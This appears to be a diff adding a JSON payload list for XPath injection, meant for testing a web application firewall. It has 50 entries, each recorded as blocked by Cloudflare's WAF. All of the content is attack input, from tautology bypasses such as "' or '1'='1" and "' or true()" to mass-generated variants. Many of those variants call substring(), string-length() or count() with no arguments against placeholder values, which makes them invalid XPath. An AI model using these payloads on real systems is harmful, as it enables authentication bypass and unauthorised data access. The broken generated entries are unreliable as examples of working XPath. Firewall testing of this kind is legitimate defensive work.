@@ -1,0 +1,707 @@
+{
+  "category": "xpath_injection",
+  "subcategory": "comprehensive",
+  "count": 50,
+  "payloads": [
+    {
+      "id": "xpath_injection-9000",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or '1'='1 or ''='",
+      "description": "XPath OR '1'='1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9001",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' and '1'='1 and ''='",
+      "description": "XPath AND '1'='1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9002",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or 1=1 or ''='",
+      "description": "XPath OR 1=1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9003",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' and 1=1 and ''='",
+      "description": "XPath AND 1=1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9004",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or true() or ''='",
+      "description": "XPath OR true()",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9005",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' and true() and ''='",
+      "description": "XPath AND true()",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9006",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or not(false()) or ''='",
+      "description": "XPath OR not(false())",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9007",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' and not(false()) and ''='",
+      "description": "XPath AND not(false())",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9008",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value1' or ''='",
+      "description": "XPath name() value1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9009",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value2' or ''='",
+      "description": "XPath name() value2",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9010",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value3' or ''='",
+      "description": "XPath name() value3",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9011",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value4' or ''='",
+      "description": "XPath name() value4",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9012",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value5' or ''='",
+      "description": "XPath name() value5",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9013",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value6' or ''='",
+      "description": "XPath name() value6",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9014",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value7' or ''='",
+      "description": "XPath name() value7",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9015",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value8' or ''='",
+      "description": "XPath name() value8",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9016",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value9' or ''='",
+      "description": "XPath name() value9",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9017",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or name()='value10' or ''='",
+      "description": "XPath name() value10",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9018",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value1' or ''='",
+      "description": "XPath string() value1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9019",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value2' or ''='",
+      "description": "XPath string() value2",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9020",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value3' or ''='",
+      "description": "XPath string() value3",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9021",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value4' or ''='",
+      "description": "XPath string() value4",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9022",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value5' or ''='",
+      "description": "XPath string() value5",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9023",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value6' or ''='",
+      "description": "XPath string() value6",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9024",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value7' or ''='",
+      "description": "XPath string() value7",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9025",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value8' or ''='",
+      "description": "XPath string() value8",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9026",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value9' or ''='",
+      "description": "XPath string() value9",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9027",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string()='value10' or ''='",
+      "description": "XPath string() value10",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9028",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value1' or ''='",
+      "description": "XPath substring() value1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9029",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value2' or ''='",
+      "description": "XPath substring() value2",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9030",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value3' or ''='",
+      "description": "XPath substring() value3",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9031",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value4' or ''='",
+      "description": "XPath substring() value4",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9032",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value5' or ''='",
+      "description": "XPath substring() value5",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9033",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value6' or ''='",
+      "description": "XPath substring() value6",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9034",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value7' or ''='",
+      "description": "XPath substring() value7",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9035",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value8' or ''='",
+      "description": "XPath substring() value8",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9036",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value9' or ''='",
+      "description": "XPath substring() value9",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9037",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or substring()='value10' or ''='",
+      "description": "XPath substring() value10",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9038",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value1' or ''='",
+      "description": "XPath string-length() value1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9039",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value2' or ''='",
+      "description": "XPath string-length() value2",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9040",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value3' or ''='",
+      "description": "XPath string-length() value3",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9041",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value4' or ''='",
+      "description": "XPath string-length() value4",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9042",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value5' or ''='",
+      "description": "XPath string-length() value5",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9043",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value6' or ''='",
+      "description": "XPath string-length() value6",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9044",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value7' or ''='",
+      "description": "XPath string-length() value7",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9045",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value8' or ''='",
+      "description": "XPath string-length() value8",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9046",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value9' or ''='",
+      "description": "XPath string-length() value9",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9047",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or string-length()='value10' or ''='",
+      "description": "XPath string-length() value10",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9048",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or count()='value1' or ''='",
+      "description": "XPath count() value1",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xpath_injection-9049",
+      "category": "xpath_injection",
+      "subcategory": "comprehensive",
+      "payload": "' or count()='value2' or ''='",
+      "description": "XPath count() value2",
+      "technique": "xpath_injection",
+      "source": "generated_massive",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
